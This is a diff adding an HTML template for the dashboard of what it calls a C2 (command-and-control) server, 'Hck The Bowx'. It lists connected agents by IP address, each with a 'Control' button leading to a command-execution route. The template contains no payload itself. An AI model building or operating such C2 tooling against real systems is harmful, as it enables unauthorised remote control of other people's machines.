@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hck The Bowx | C2 Server Dashboard</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <style>
+        body {
+            background: #111;
+            color: #00ff41;
+            font-family: 'Fira Mono', 'Consolas', monospace;
+            margin: 0;
+            padding: 2em;
+        }
+        h1, h2 {
+            text-align: center;
+            text-shadow: 0 0 8px #00ff41;
+            letter-spacing: 2px;
+        }
+        table {
+            width: 80%;
+            margin: 2em auto;
+            border-collapse: collapse;
+            background: rgba(20, 20, 20, 0.95);
+            box-shadow: 0 0 24px #00ff41;
+        }
+        th, td {
+            padding: 1em;
+            border: 1px solid #00ff41;
+            text-align: center;
+        }
+        th {
+            background: #222;
+            color: #00ff41;
+            font-size: 1.1em;
+        }
+        tr:nth-child(even) {
+            background: #181818;
+        }
+        tr:hover {
+            background: #222;
+        }
+        button {
+            background: #111;
+            color: #00ff41;
+            border: 2px solid #00ff41;
+            padding: 0.5em 1.5em;
+            border-radius: 4px;
+            font-family: inherit;
+            font-size: 1em;
+            cursor: pointer;
+            box-shadow: 0 0 8px #00ff41;
+            transition: background 0.2s, color 0.2s;
+        }
+        button:hover {
+            background: #00ff41;
+            color: #111;
+        }
+        a {
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>💀 Hck The Bowx 💀</h1>
+    <h2>Connected Agents</h2>
+    <table>
+        <tr>
+            <th>Agent ID</th>
+            <th>IP Address</th>
+            <th>Action</th>
+        </tr>
+    {% for i in range(threads|length) %}
+        {% if ips[i] %}
+        <tr>
+            <td>Agent {{ i+1 }}</td>
+            <td>{{ ips[i] }}</td>
+            <td>
+                <a href="{{ url_for('executecmd', agentname='Agent ' ~ (i+1)|string) }}">
+                    <button>Control</button>
+                </a>
+            </td>
+        </tr>
+        {% endif %}
+    {% endfor %}
+    </table>
